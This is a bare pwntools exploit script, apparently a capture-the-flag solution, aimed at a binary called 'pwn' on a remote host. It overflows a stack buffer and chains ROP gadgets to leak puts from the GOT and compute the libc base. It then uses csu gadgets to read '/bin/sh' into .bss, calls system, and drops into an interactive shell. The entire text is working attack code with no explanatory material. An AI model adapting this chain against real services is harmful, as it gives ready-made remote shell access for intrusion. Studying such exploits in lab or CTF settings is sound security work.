from pwn import *

local = 0
context.terminal=["tmux","splitw","-h"]
if local :
    a=process("./pwn")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    a=remote("111.33.164.4",50006)
    libc=ELF("libc-2.19.so")
elf=ELF("./pwn")
def debug():
    gdb.attach(a,'''
    b *0x0000000004007C2
    ''')
def init():
    a.sendline("10000")
    a.recvuntil("OH, WHY ARE YOU SO GOOD?\n")

#debug()
puts_plt=elf.plt["puts"]
pop_rdi_ret=0x0000000000414fc3
puts_got=elf.got["puts"]
start_addr=0x000000000400650
init()
payload='A'*24
payload+=p64(pop_rdi_ret)
payload+=p64(puts_got)
payload+=p64(puts_plt)
payload+=p64(start_addr)
a.sendline(payload)
puts_addr=u64(a.recv(6).ljust(8,'\x00'))
success("puts ==> 0x%x"%puts_addr)
libc_base=puts_addr-libc.symbols["puts"]
print hex(libc_base)
system_addr=libc_base+libc.symbols["system"]
bin_sh_addr=libc_base+next(libc.search("/bin/sh"))
mprotect=libc_base+libc.symbols["mprotect"]

init()
read_got=elf.got["read"]
csu_foot=0x000000000414FBA
csu_head=0x000000000414FA0
payload='A'*24
payload+=p64(csu_foot)
payload+=p64(0)
payload+=p64(1)
payload+=p64(read_got)
payload+=p64(100)
payload+=p64(elf.bss())
payload+=p64(0)
payload+=p64(csu_head)
payload+='A'*56
payload+=p64(pop_rdi_ret)
payload+=p64(elf.bss())
payload+=p64(system_addr)
a.sendline(payload)
sleep(0.5)
a.sendline("/bin/sh\x00")



a.interactive()